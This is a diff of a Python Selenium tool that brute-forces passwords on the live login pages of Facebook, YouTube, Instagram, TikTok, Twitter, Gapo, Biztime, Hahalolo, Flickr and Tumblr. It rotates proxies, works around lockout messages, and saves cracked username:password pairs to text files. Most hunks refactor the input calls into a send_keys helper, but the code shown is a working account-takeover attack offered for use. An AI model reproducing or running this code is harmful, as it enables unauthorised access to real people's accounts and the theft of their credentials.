@@ -44,7 +44,7 @@ use = OptionParser("""{}
 -b --biztime                        ACCOUNT biztime
 -H --hahalolo                       ACCOUNT hahalolo
 -F --flickr                         ACCOUNT flickr
--B --tumblr                         ACCOUNT tumblr   
+-B --tumblr                         ACCOUNT tumblr
 -l --list                           List    Password BruteForce
 -h --help                           Show this help message and exit
 ============================================================================================
@@ -90,7 +90,6 @@ social_name = ['facebook', 'youtube', 'instagram',
 
 def getProxyList():
     getProxies(options.getproxylist, options.type)
-
 
     # =================================LOAD PROXY==============================
 proxy_list = []
@@ -175,11 +174,10 @@ def facebook():
                     continue
                 except:
                     print
-            brows.find_element(By.ID, "email").send_keys(options.facebook)
+            send_keys(brows.find_element(By.ID, "email"), options.facebook)
             print(Fore.LIGHTYELLOW_EX +
                   'Password [==] '+password+Fore.RESET)
-            brows.find_element(By.ID, "pass").send_keys(
-                password)
+            send_keys(brows.find_element(By.ID, "pass"), password)
             brows.find_element(By.ID, "loginbutton").click()
             try:
                 if brows.find_element(By.XPATH, "//div[@id='error_box']/div").text == "Access Denied":
@@ -228,7 +226,7 @@ def youtube():
     except Exception as e:
         print(e)
     brows.implicitly_wait(5)
-    brows.find_element(By.ID, "identifierId").send_keys(options.youtube)
+    send_keys(brows.find_element(By.ID, "identifierId"), options.youtube)
     brows.find_element(By.ID, "identifierNext").click()
     brows.implicitly_wait(5)
     for password in io.open(options.list_password, "r").readlines():
@@ -236,8 +234,8 @@ def youtube():
         print('\rPassword [==] {} '.format(password).rstrip("\n"))
         sys.stdout.flush
         try:
-            brows.find_element(
-                By.XPATH, "//*[@id='password']/div/div/div/input").send_keys(password)
+            send_keys(brows.find_element(
+                By.XPATH, "//*[@id='password']/div/div/div/input"), password)
             brows.find_element(By.ID, "loginbutton").click()
             brows.find_element(By.ID, "identifierNext").click()
             if 'https://www.youtube.com' in brows.current_url:
@@ -319,11 +317,11 @@ def instagram():
                         By.XPATH, "//body/div[4]/div/div/button[1]").click()
                 except:
                     print
-                brows.find_element(
-                    By.XPATH, '//*[@id="loginForm"]/div/div/div/label/input').send_keys(options.instagram)
+                send_keys(brows.find_element(
+                    By.XPATH, '//*[@id="loginForm"]/div/div/div/label/input'), options.instagram)
                 count_login = 1
-            brows.find_element(
-                By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input').send_keys(password)
+            send_keys(brows.find_element(
+                By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input'), password)
             brows.find_element(
                 By.XPATH, '//*[@id="loginForm"]/div/div[3]/button').click()
             time.sleep(5)
@@ -385,11 +383,11 @@ def tiktok():
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://www.tiktok.com/login/phone-or-email/email")
-                brows.find_element(
-                    By.XPATH, "//*[@id='loginContainer']/div/form/div/input").send_keys(options.tiktok)
+                send_keys(brows.find_element(
+                    By.XPATH, "//*[@id='loginContainer']/div/form/div/input"), options.tiktok)
                 count_login = 1
-            brows.find_element(
-                By.XPATH, "//*[@id='loginContainer']/div/form/div[2]/div/input").send_keys(password)
+            send_keys(brows.find_element(
+                By.XPATH, "//*[@id='loginContainer']/div/form/div[2]/div/input"), password)
             brows.find_element(
                 By.XPATH, "//*[@id='loginContainer']/div/form/button").click()
             if "https://www.tiktok.com/foryou" in brows.current_url or check_login_tiktok(brows):
@@ -449,14 +447,14 @@ def twitter():
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://twitter.com/i/flow/login")
-                brows.find_element(By.NAME, "text").send_keys(options.twitter)
+                send_keys(brows.find_element(By.NAME, "text"), options.twitter)
                 brows.find_element(
                     By.XPATH, "//*[@id='layers']/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div[1]/div/div/div[6]").click()
                 count_login = 1
             print(Fore.LIGHTYELLOW_EX +
                   'Password [==] '+password+Fore.RESET)
-            brows.find_element(
-                By.XPATH, PASS_PATH_TWITTER).send_keys(password)
+            send_keys(brows.find_element(
+                By.XPATH, PASS_PATH_TWITTER), password)
             brows.find_element(By.XPATH, SUBMIT_PATH_TWITTER).click()
             # try:
             #     brows.find_element(By.XPATH, "//div[@role='button']")
@@ -513,14 +511,14 @@ def gapo():
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://www.gapo.vn/login")
-                brows.find_element(
-                    By.XPATH, path+"div[3]/input").send_keys(options.gapo)
+                send_keys(brows.find_element(
+                    By.XPATH, path+"div[3]/input"), options.gapo)
                 brows.find_element(By.XPATH, path+"button").click()
                 count_login = 1
             print(Fore.LIGHTYELLOW_EX +
                   'Password [==] '+password+Fore.RESET)
-            brows.find_element(
-                By.XPATH, path+"div[2]/input").send_keys(password)
+            send_keys(brows.find_element(
+                By.XPATH, path+"div[2]/input"), password)
             brows.find_element(By.XPATH, path+"button").click()
             try:
                 if brows.find_element(By.XPATH, "//div[@class='modal-body']").text == "Bạn đã đạt giới hạn số lần đăng nhập. Bạn vui lòng thử lại sau!":
@@ -554,16 +552,6 @@ def gapo():
 # Complete
 
 
-def check_login_biztime(brows):
-    try:
-        brows.implicitly_wait(1)
-        brows.find_element(
-            By.XPATH, "//div[@class='valign tag_auth_animation']")
-        return True
-    except:
-        return False
-
-
 def biztime():
     count_while = 0
     count_login = 0
@@ -582,22 +570,24 @@ def biztime():
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://biztime.com.vn/")
-                brows.find_element(By.NAME, "username").send_keys(
-                    options.biztime)
+                send_keys(brows.find_element(
+                    By.NAME, "username"), options.biztime)
                 count_login = 1
             print(Fore.LIGHTYELLOW_EX +
                   'Password [==] '+password+Fore.RESET)
-            brows.find_element(By.NAME, "password").send_keys(password)
+            send_keys(brows.find_element(By.NAME, "password"), password)
             brows.find_element(
                 By.XPATH, "//button[@class='btn btn-main btn-mat disable_btn tag_wel_btn']").click()
-            if check_login_biztime(brows):
-                print(
-                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
+            try:
+                brows.find_element(
+                    By.XPATH, "//div[@class='valign tag_auth_animation']")
+                print("{}[V] Password Found [{}]{}".format(
+                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                 io.open("Biztime.txt", "a").write(
                     options.biztime+":"+password+"\n")
                 brows.quit()
                 break
-            else:
+            except:
                 if brows.find_element(By.XPATH, "//div[@class='errors']").text == "Tạm khóa 10 phút do bạn đăng nhập sai nhiều lần!":
                     brows.quit()
                     count_login = 0
@@ -637,8 +627,8 @@ def hahalolo():
                 brows.implicitly_wait(5)
                 brows.get("https://accounts.hahalolo.com/sign-in/")
                 try:
-                    brows.find_element(By.ID, "accountId").send_keys(
-                        options.hahalolo)
+                    send_keys(brows.find_element(
+                        By.ID, "accountId"), options.hahalolo)
                 except:
                     brows.quit()
                     count_login = 0
@@ -646,7 +636,7 @@ def hahalolo():
                 count_login = 1
             print(Fore.LIGHTYELLOW_EX +
                   'Password [==] '+password+Fore.RESET)
-            brows.find_element(By.ID, "password").send_keys(password)
+            send_keys(brows.find_element(By.ID, "password"), password)
             brows.find_element(
                 By.XPATH, "//div[@id='app']/div/div/div/div/div[2]/div/div/div/div[2]").click()
             try:
@@ -697,14 +687,14 @@ def flickr():
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://identity.flickr.com/login")
-                brows.find_element(
-                    By.XPATH, "//input[@id='login-email']").send_keys(options.flickr)
+                send_keys(brows.find_element(
+                    By.XPATH, "//input[@id='login-email']"), options.flickr)
                 brows.find_element(
                     By.XPATH, "//form/button").click()
             print(Fore.LIGHTYELLOW_EX +
                   'Password [==] '+password+Fore.RESET)
-            brows.find_element(
-                By.XPATH, "//input[@id='login-password']").send_keys(password)
+            send_keys(brows.find_element(
+                By.XPATH, "//input[@id='login-password']"), password)
             brows.find_element(
                 By.XPATH, "//form/button").click()
             try:
@@ -760,12 +750,12 @@ def tumblr():
                 brows.set_page_load_timeout(30)
                 brows.implicitly_wait(5)
                 brows.get("https://www.tumblr.com/login")
-                brows.find_element(
-                    By.XPATH, "//input[@name='email']").send_keys(options.tumblr)
+                send_keys(brows.find_element(
+                    By.XPATH, "//input[@name='email']"), options.tumblr)
             print(Fore.LIGHTYELLOW_EX +
                   'Password [==] '+password+Fore.RESET)
-            brows.find_element(
-                By.XPATH, "//input[@name='password']").send_keys(password)
+            send_keys(brows.find_element(
+                By.XPATH, "//input[@name='password']"), password)
             brows.find_element(
                 By.XPATH, "//form/button").click()
             try:
@@ -802,6 +792,7 @@ def tumblr():
                   '[!] Brute Fore Stopping...'+Fore.RESET)
             brows.quit()
             break
+
 # ================================SEND KEYS====================================
 
 
